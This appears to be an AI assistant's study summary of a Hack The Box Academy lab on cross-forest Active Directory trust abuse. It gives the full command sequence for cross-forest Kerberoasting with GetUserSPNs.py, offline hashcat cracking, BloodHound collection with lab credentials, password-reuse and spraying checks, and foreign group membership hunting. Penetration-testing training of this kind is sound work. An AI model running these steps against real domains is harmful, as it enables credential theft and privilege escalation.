## Cross-Forest Trust Abuse & Enumeration

![Image](https://images.openai.com/static-rsc-4/SiHRpAq7Yut4kS1_ItH4h-wRlcnxarLEAR9o5AwxTGqsIKfpcX2yj0Al3Q6gJdR_5ycGNM5DBD406F3rljvZwRV99uSWNAku8s-z1zhmOFphVGXVIjBWEimZR7fbOtCQ-JBwx5xbCKS9iGOkYFnyeN5_qYARyfgZQ88UVCSL-DSPqMIdUTDM9o8brrsKKESQ?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/3qvE7oT8Np9RLq31SKGxDM97_B3Tsiseivvi1p1AyySBZz7JfYLHPT04PQGCq6eeyoB9ASaV82Gjq9fI6R-lsvakLJP189arppuE-_FrINOGF3W5ankjObt0YCpfNp7FQ1F5Yb8Gu6Q8f7mPLmfkeBEaX6KCXuHhHi8wpqBgsdy9qvwRbh9vAyrMFhZdg3to?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Q4Bwfgh-X0fJmCe4PqYCqHPievs5zHqTmPhL7fxOhyVZdjSzkYo4WUfcAaJ7huFEQW0IxC8_Qvug9uJ5mT7CR78PLhoT2ypiWb6n0IUMSQwhXThRWGS4lJ_ZNCxrBpqzNXcH2MDdVba91zf-MmXxyzNHRnL7pei9mDmsCxPfMFteRDzmLjBwKal_KIcrcrfQ?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/-t_tdpwzFaHOzv07i12HFuohzJIkoZ04DN1Amk8fXiYLqwkzaAIwNtfEKGz9GZUEeLPlGjo3AEYkD8VaLPvnnm4H0HyW59bd5JO8KKkbUAi1jENk20nIqIjFqVJ4Yg5vgvH5jwAGJ8IQE_hUOSGoNiIoPgV6ObMQBVu3A7qJKv1fyDsPlXZCRwWYkU90CYEB?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/nEBVC2fKdZX-0KGysWiStqmPZQDIUfoPReDnCJHqAdEB-mV1RfAuu839MRqeToutpMXFx31e81mOkZOvWlLBkRZpcr61mdHwMnhHuEZ5T7OYAUmeRMSimkd5ipzJleav0rxrfQcOfIPFRDccDc7sCdKx9fr6tOc7bUXOKwBEg7sH54gYAMtchuXnWDtOhHlO?purpose=fullsize)

### 1. What are Domain Trusts?

A **domain trust** is a relationship between two Active Directory domains that allows users and resources in one domain to be accessed or authenticated against another domain.

In this module, the important scenario is a **cross-forest trust**:

```text
INLANEFREIGHT.LOCAL
        |
        |  Bidirectional
        |  Forest Trust
        |
        v
FREIGHTLOGISTICS.LOCAL
```

Our current domain:

```text
INLANEFREIGHT.LOCAL
```

Trusted domain:

```text
FREIGHTLOGISTICS.LOCAL
```

The important point is that **a trust does not automatically mean administrative access**.

Instead, it gives us an additional authentication path that may allow us to:

- Enumerate the other domain
    
- Kerberoast accounts in the trusted domain
    
- Identify foreign group memberships
    
- Find privileged users crossing the trust
    
- Identify password reuse
    
- Discover potential lateral-movement paths
    

---

# 2. Cross-Forest Kerberoasting

One of the most important attacks in this section is **Cross-Forest Kerberoasting**.

The idea is:

```text
Our credentials
      |
      v
INLANEFREIGHT.LOCAL
      |
      | Cross-Forest Trust
      v
FREIGHTLOGISTICS.LOCAL
      |
      v
Find SPN
      |
      v
Request TGS
      |
      v
Kerberoast
      |
      v
Offline password cracking
```

If the password is weak and successfully cracked, the account may provide significant access in the trusted domain.

---

## 3. GetUserSPNs.py

From a Linux attack host, the module uses:

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

The important argument is:

```text
-target-domain FREIGHTLOGISTICS.LOCAL
```

This tells `GetUserSPNs.py` to query the **trusted domain** rather than only the current domain.

The credentials belong to:

```text
INLANEFREIGHT.LOCAL
```

while the target domain is:

```text
FREIGHTLOGISTICS.LOCAL
```

### Expected result

The walkthrough finds:

```text
ServicePrincipalName                 Name
-----------------------------------  --------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc
```

The account is:

```text
mssqlsvc
```

And its SPN is:

```text
MSSQLsvc/sql01.freightlogstics:1433
```

The walkthrough also shows that this account is a member of:

```text
CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

### Important

This is a **very significant finding** because the Kerberoastable account is associated with the **Domain Admins** group in the target domain.

---

# 4. Requesting the TGS

Simply finding the SPN isn't enough.

We can request the Kerberos service ticket using:

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

The important addition is:

```text
-request
```

Without `-request`:

```text
Find SPN
```

With `-request`:

```text
Find SPN
      ↓
Request TGS
      ↓
Receive Kerberos TGS hash
```

The output contains a hash beginning with:

```text
$krb5tgs$23$
```

This is the format Hashcat can process using mode:

```text
13100
```

---

# 5. Offline Cracking

Once we have the TGS hash, we can perform offline password cracking.

The module specifies:

```bash
hashcat -m 13100 <hashfile> <wordlist>
```

Where:

```text
-m 13100
```

means:

```text
Kerberos 5, etype 23, TGS-REP
```

### Your lab result

You successfully performed this exact step against:

```text
mssqlsvc
```

and Hashcat returned:

```text
Status...........: Cracked
Hash.Mode........: 13100
Recovered........: 1/1
```

So your cross-forest Kerberoasting path was successful.

---

# 6. Why the Cracked Account Matters

The walkthrough explains an important point:

If the password is successfully cracked, we may be able to authenticate into:

```text
FREIGHTLOGISTICS.LOCAL
```

as the compromised account.

In the walkthrough, `mssqlsvc` is associated with:

```text
Domain Admins
```

Therefore the potential attack chain becomes:

```text
INLANEFREIGHT user
        |
        v
Cross-Forest Trust
        |
        v
FREIGHTLOGISTICS
        |
        v
Kerberoast mssqlsvc
        |
        v
Offline crack
        |
        v
mssqlsvc credentials
        |
        v
Potential Domain Admin access
```

This is the key concept to remember.

---

# 7. Password Reuse

The walkthrough also recommends checking for **password reuse**.

If the cracked password for:

```text
mssqlsvc
```

is reused elsewhere, it may provide additional access.

Conceptually:

```text
FREIGHTLOGISTICS\mssqlsvc
          |
          | cracked password
          v
Check for reuse
          |
    +-----+------+
    |            |
    v            v
Current      Other accounts
domain       / services
```

The walkthrough specifically mentions checking whether the account exists in the current domain and whether the same password is reused.

It also discusses the possibility of a **single password spray** against other service accounts when appropriate in an authorized assessment.

---

# 8. Hunting Foreign Group Membership

Cross-forest Kerberoasting isn't the only attack path.

Another important technique is looking for:

> **Foreign Group Membership**

This occurs when an account from one domain is a member of a group in another domain.

For example:

```text
INLANEFREIGHT.LOCAL
        |
        | Administrator
        |
        v
FREIGHTLOGISTICS.LOCAL
        |
        v
Administrators
```

This can create a powerful attack path across a trust.

---

# 9. Domain Local Groups

An important Active Directory concept from the module:

> **Domain Local Groups allow users from outside their forest.**

Therefore, when dealing with a bidirectional forest trust, we should pay particular attention to **Domain Local Groups**.

A privileged account from Domain A may potentially appear inside a privileged group in Domain B.

Example from the walkthrough:

```text
ADMINISTRATOR@
INLANEFREIGHT.LOCAL
        |
        |
        v
ADMINISTRATORS@
FREIGHTLOGISTICS.LOCAL
```

![Image](https://images.openai.com/static-rsc-4/noV3QTK60U1KDGrb5z9QElo_b0Qg-66E9jo32NxlR3-dZUK73sixy1kQsDYzkZR_wzvnVWSM2rozbBRCIuzpZ3h3Y7ph-tJfr8ucPNdmuAi4onxc898qUg3iWv8eqi2moLtMejU9R9hK4WCKiGcV2YjmZZ3UFy3-cwjwnxN_S5ojwWYIn5BNh-TQn70G_B4F?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/pFZDtCC4ZzcSJC6yGB3EDRVhUZfblRWSrA0-5z-NlXEOrucS32D_MkxyyYf1q99imW-gFt52W8o7tTwnrQjr-o4N2yO8dRV8zZ6WoP_FofCport4Hh5HUeuRQGObGdpWRQ-3mB0xhDBoaHulXMzgQw8LFqOXCR09AuJfuewrl8pualEY8Ns0NE9HOdsfEJ33?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/MSqUysdt9389MhiyOw4U8sT4PBD_ch4lbhnjMajIvhPJyApOnoPk_emA2U1cFdOCzBIBHNzeL6lGD9bLWvX84Zi5cyi3Wr3LdH3lQCKs_snrpwJnka1ORCUzcJNu3xd7GcMrqgy0adBmHqy-3NPe5Zdk84BLvykiyGsxYWqiUszsVOzL0XJP68Ezm7V7yHDJ?purpose=fullsize)

---

# 10. BloodHound-python

When working from Linux, the module uses:

```text
bloodhound-python
```

The purpose is to collect Active Directory relationship information that can later be imported into BloodHound.

It can collect information such as:

- Users
    
- Groups
    
- Computers
    
- Domains
    
- Trusts
    
- Group memberships
    
- Relationships between objects
    

---

# 11. DNS Requirement

One of the most important practical points from the module is **DNS**.

`bloodhound-python` requires a DNS hostname for the Domain Controller rather than simply an IP address in this scenario.

The module demonstrates modifying:

```text
/etc/resolv.conf
```

For the `INLANEFREIGHT.LOCAL` domain:

```text
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

The important relationship is:

```text
Domain:
INLANEFREIGHT.LOCAL

DNS Server / DC:
172.16.5.5

DC:
ACADEMY-EA-DC01
```

---

# 12. BloodHound Against INLANEFREIGHT.LOCAL

The walkthrough uses:

```bash
bloodhound-python -d INLANEFREIGHT.LOCAL \
-dc ACADEMY-EA-DC01 \
-c All \
-u forend \
-p Klmcargo2
```

### Breakdown

```text
-d
```

Specifies the domain:

```text
INLANEFREIGHT.LOCAL
```

```text
-dc
```

Specifies the Domain Controller:

```text
ACADEMY-EA-DC01
```

```text
-c All
```

Collects all available collection categories.

```text
-u
```

Username.

```text
-p
```

Password.

---

# 13. Expected BloodHound Output

The walkthrough reports:

```text
Found AD domain: inlanefreight.local
Connecting to LDAP server: ACADEMY-EA-DC01
Found 1 domains
Found 2 domains in the forest
Found 559 computers
Found 2950 users
Found 183 groups
Found 2 trusts
```

The important observation is:

```text
Found 2 trusts
```

This confirms that BloodHound can enumerate the trust relationships.

---

# 14. Collecting FREIGHTLOGISTICS.LOCAL

The same methodology is then applied to:

```text
FREIGHTLOGISTICS.LOCAL
```

The module shows:

```text
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

And uses:

```bash
bloodhound-python \
-d FREIGHTLOGISTICS.LOCAL \
-dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL \
-c All \
-u forend@inlanefreight.local \
-p Klmcargo2
```

Notice something important here:

The credentials are from:

```text
INLANEFREIGHT.LOCAL
```

while BloodHound is querying:

```text
FREIGHTLOGISTICS.LOCAL
```

This demonstrates the usefulness of the **cross-forest trust**.

---

# 15. Expected FREIGHTLOGISTICS Results

The walkthrough reports:

```text
Found AD domain: freightlogistics.local
Connecting to LDAP server:
ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL

Found 1 domains
Found 1 domains in the forest
Found 5 computers
Found 9 users
Found 52 groups
Found 1 trusts
```

So the second domain contains:

|Object|Found|
|---|--:|
|Domains|1|
|Computers|5|
|Users|9|
|Groups|52|
|Trusts|1|

---

# 16. Compressing BloodHound Data

After collection, BloodHound generates JSON files.

The walkthrough combines them:

```bash
zip -r ilfreight_bh.zip *.json
```

This creates:

```text
ilfreight_bh.zip
```

The ZIP can then be uploaded into the BloodHound GUI.

---

# 17. BloodHound Analysis

After importing the data, the module tells us to navigate to:

```text
Analysis
    ↓
Users with Foreign Domain Group Membership
```

Then select:

```text
Source Domain:
INLANEFREIGHT.LOCAL
```

This allows us to identify users from the source domain that have group memberships in the trusted domain.

The important example is:

```text
ADMINISTRATOR@INLANEFREIGHT.LOCAL
                |
                v
ADMINISTRATORS@FREIGHTLOGISTICS.LOCAL
```

This is a potentially powerful cross-domain relationship.

---

# 18. The Complete Attack Chain

This is the **most important revision diagram** from the entire section:

![Image](https://images.openai.com/static-rsc-4/OEdJcPl1NitOmlqHg0iBVGTxVyrQt8GyY2Lp3bQWyToOGYRPTxkoHTFAmPsH7zGK7y7DpkXPTvLd4dJw6pQvmBg7TSv352h0zLA_6GHps66M_XQVwjv4lf6khGoe9n-6jLr77OkAPFr0PJ0EziSlYIv4uxnibu0rlCbYWeMhOf1B0zg9sJkeWF9feAstFhfL?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Gbj3puue7yFGsFYyesdWOKl2Qj25IxuQ1kkGz9OOs0S96-srtoWit9qs9-3OtOcyvfuN9i3bxlyvw4X-neF5BnKI58svduMgVYxR_DSUQ7dG6qo1pE14go-cueKRcYV7jnQQQlSIWUdt1c9gsIt0OCyldCk_kI7pzvPsWQ18976qGCMrHxMA1JTmVVdbWfTW?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/3qvE7oT8Np9RLq31SKGxDM97_B3Tsiseivvi1p1AyySBZz7JfYLHPT04PQGCq6eeyoB9ASaV82Gjq9fI6R-lsvakLJP189arppuE-_FrINOGF3W5ankjObt0YCpfNp7FQ1F5Yb8Gu6Q8f7mPLmfkeBEaX6KCXuHhHi8wpqBgsdy9qvwRbh9vAyrMFhZdg3to?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/VZtir6I3y4BDsFV36uhnbranMUfH_nOXYGyPYwaLt1ZgB2hU2nOuCc0vmse5D55vW78GF7pD5Ah4-dcym3bINVIZj3Dv-rGpV4zVkW6GnDh0VuHZlvmNuMsuZztIHtoV_EGAmyikXWvLmVNWXt61xrMYdd_KHQlM4mKXql6Y49aSOcMt2eoZg4AS0IMVRGNi?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/-t_tdpwzFaHOzv07i12HFuohzJIkoZ04DN1Amk8fXiYLqwkzaAIwNtfEKGz9GZUEeLPlGjo3AEYkD8VaLPvnnm4H0HyW59bd5JO8KKkbUAi1jENk20nIqIjFqVJ4Yg5vgvH5jwAGJ8IQE_hUOSGoNiIoPgV6ObMQBVu3A7qJKv1fyDsPlXZCRwWYkU90CYEB?purpose=fullsize)

```text
                INLANEFREIGHT.LOCAL
                         |
                         |
                  Forest Trust
                         |
                         v
                FREIGHTLOGISTICS.LOCAL
                         |
              +----------+----------+
              |                     |
              v                     v
       Kerberoast SPNs      Foreign Membership
              |                     |
              v                     v
        Request TGS          BloodHound
              |                     |
              v                     v
       Extract Hash          Find Relationships
              |
              v
       Hashcat 13100
              |
              v
       Recover Password
              |
              v
       Authenticate
              |
              v
   Potential Privileged Access
```

---

# 19. Important Commands — Quick Reference

### Check current domain

```powershell
whoami
```

```powershell
echo $env:USERDNSDOMAIN
```

### Find Domain Controller

```powershell
nltest /DSGETDC:INLANEFREIGHT.LOCAL
```

### Enumerate trusts

```powershell
nltest /DOMAIN_TRUSTS /V
```

PowerView:

```powershell
Get-DomainTrust
```

```powershell
Get-DomainTrustMapping
```

### Cross-forest Kerberoasting — Linux

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

Request TGS:

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

### Crack Kerberos TGS

```bash
hashcat -m 13100 hashfile /usr/share/wordlists/rockyou.txt
```

### BloodHound collection

```bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u <user> -p <password>
```

Target trusted domain:

```bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u <user>@inlanefreight.local -p <password>
```

### Compress BloodHound results

```bash
zip -r ilfreight_bh.zip *.json
```

---

# 20. Key Things to Remember for the HTB Module

### ⭐ 1. Trust ≠ automatic access

A trust creates an authentication relationship, but additional permissions are required.

### ⭐ 2. Cross-forest Kerberoasting

A user from one forest can potentially request a service ticket for an SPN in the trusted forest.

### ⭐ 3. Look for SPNs

Especially:

```text
MSSQLsvc
```

and other service accounts.

### ⭐ 4. Request the TGS

The important flag is:

```text
-request
```

### ⭐ 5. Crack offline

For the RC4 Kerberos TGS in this walkthrough:

```text
Hashcat mode 13100
```

### ⭐ 6. Check the account's privileges

A Kerberoastable account becomes especially interesting when it has privileged group membership.

### ⭐ 7. Look for password reuse

A cracked service-account password may be reused elsewhere.

### ⭐ 8. Hunt foreign group membership

Use BloodHound to identify relationships such as:

```text
INLANEFREIGHT.LOCAL user
             ↓
FREIGHTLOGISTICS.LOCAL group
```

### ⭐ 9. DNS is critical

When BloodHound or AD tools fail, check:

```text
DNS
Domain Controller resolution
LDAP connectivity
Kerberos connectivity
```

### ⭐ 10. BloodHound shows relationships

The goal isn't simply collecting users/computers. The important part is identifying **relationships that create attack paths**.

---

# 21. Troubleshooting — Relevant to What We Encountered

Your earlier errors make more sense now.

You repeatedly received:

```text
ERROR_NO_SUCH_DOMAIN
```

for:

```text
nltest /DSGETDC:FREIGHTLOGISTICS.LOCAL
```

and:

```text
A referral was returned from the server.
```

from PowerView.

The important discovery was that the trusted domain's DC was:

```text
ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
```

Once the environment was reachable correctly, your Rubeus command successfully found:

```text
Total kerberoastable users : 1
```

and:

```text
SamAccountName : mssqlsvc
```

with:

```text
MSSQLsvc/sql01.freightlogstics:1433
```

You then transferred the resulting hash to Kali and successfully cracked it with:

```text
hashcat -m 13100
```

So **the Kerberoasting portion of the walkthrough has been successfully reproduced in your lab.**

---

# 22. Final Module Summary

The overall lesson is:

> **Domain trusts can create additional attack paths between otherwise separate Active Directory environments.**

The module demonstrates two major approaches:

```text
                    DOMAIN TRUST
                         |
             +-----------+-----------+
             |                       |
             v                       v
      Cross-Forest             Foreign Group
      Kerberoasting             Membership
             |                       |
             v                       v
       Request TGS              BloodHound
             |                       |
             v                       v
       Crack Offline            Find Trust Path
             |                       |
             +-----------+-----------+
                         |
                         v
              Additional Access /
              Privilege Escalation
```

The key mindset for this section is:

**Enumerate the trust → identify what crosses the trust → identify privileged relationships → test the relevant attack path.**